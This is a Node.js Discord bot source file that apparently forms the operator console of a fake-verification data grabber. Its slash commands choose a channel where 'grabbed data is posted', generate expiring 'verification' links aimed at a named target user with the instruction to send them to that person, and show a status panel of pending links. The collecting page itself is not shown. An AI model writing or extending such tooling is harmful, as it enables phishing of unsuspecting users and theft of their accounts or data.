// language: Node.js, file: src/bot.js
const {
  Client,
  GatewayIntentBits,
  REST,
  Routes,
  SlashCommandBuilder,
  EmbedBuilder,
  PermissionFlagsBits,
  ChannelType,
} = require('discord.js');
const crypto = require('crypto');
const store  = require('./utils/store');

let client = null;
function getClient() { return client; }

async function startBot() {
  client = new Client({
    intents: [
      GatewayIntentBits.Guilds,
      GatewayIntentBits.GuildMembers,
    ],
  });

  const commands = [
    new SlashCommandBuilder()
      .setName('set-channel')
      .setDescription('Set the channel where grabbed data is posted')
      .addChannelOption(opt =>
        opt.setName('channel')
           .setDescription('Output channel')
           .addChannelTypes(ChannelType.GuildText)
           .setRequired(true))
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
      .toJSON(),

    new SlashCommandBuilder()
      .setName('verify')
      .setDescription('Generate a verification link for a target user')
      .addUserOption(opt =>
        opt.setName('user')
           .setDescription('Target user')
           .setRequired(false))
      .setDefaultMemberPermissions(PermissionFlagsBits.ManageGuild)
      .toJSON(),

    new SlashCommandBuilder()
      .setName('panel')
      .setDescription('Bot status and config')
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
      .toJSON(),
  ];

  client.once('ready', async () => {
    console.log(`[bot] online as ${client.user.tag}`);
    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
    try {
      await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
      console.log('[bot] global commands registered — may take up to 1h to appear');
    } catch (e) {
      console.error('[bot] command registration failed:', e.message);
    }
  });

  client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    try {
      switch (interaction.commandName) {

        case 'set-channel': {
          const ch = interaction.options.getChannel('channel');
          store.channelId = ch.id;
          store.guildId   = interaction.guildId;
          await interaction.reply({
            content:   `✅ Output channel set to <#${ch.id}>`,
            ephemeral: true,
          });
          break;
        }

        case 'verify': {
          const target = interaction.options.getUser('user') ?? interaction.user;
          const code   = crypto.randomBytes(16).toString('hex');
          const base   = process.env.BASE_URL ?? `http://localhost:${process.env.PORT ?? 3000}`;
          const link   = `${base}/verify/${code}`;

          store.pending.set(code, {
            userId:    target.id,
            guildId:   interaction.guildId,
            username:  target.username,
            createdAt: Date.now(),
          });

          // expire after 15 minutes
          setTimeout(() => store.pending.delete(code), 15 * 60 * 1000);

          const embed = new EmbedBuilder()
            .setTitle('🔗 Verification Link Generated')
            .setColor(0x5865F2)
            .setDescription(`Send this link to <@${target.id}>`)
            .addFields(
              { name: 'Link',    value: link,              inline: false },
              { name: 'Target',  value: `<@${target.id}>`, inline: true  },
              { name: 'Expires', value: '15 minutes',       inline: true  },
            )
            .setTimestamp();

          await interaction.reply({ embeds: [embed], ephemeral: true });
          break;
        }

        case 'panel': {
          const embed = new EmbedBuilder()
            .setTitle('⚙️ Panel')
            .setColor(0x5865F2)
            .addFields(
              { name: 'Status',         value: '🟢 Online',                                              inline: true  },
              { name: 'Output Channel', value: store.channelId ? `<#${store.channelId}>` : '❌ Not set', inline: true  },
              { name: 'Pending Links',  value: String(store.pending.size),                                inline: true  },
              { name: 'Guild',          value: interaction.guild?.name ?? 'Unknown',                      inline: true  },
              { name: 'Base URL',       value: process.env.BASE_URL ?? '❌ Not set',                     inline: false },
            )
            .setTimestamp();

          await interaction.reply({ embeds: [embed], ephemeral: true });
          break;
        }
      }
    } catch (e) {
      console.error('[interaction error]', e);
      // try to respond so Discord doesn't mark it as "did not respond"
      try {
        const msg = { content: '❌ An error occurred.', ephemeral: true };
        if (interaction.deferred) await interaction.editReply(msg);
        else if (!interaction.replied) await interaction.reply(msg);
      } catch {}
    }
  });

  await client.login(process.env.DISCORD_TOKEN);
}

module.exports = { startBot, getClient };
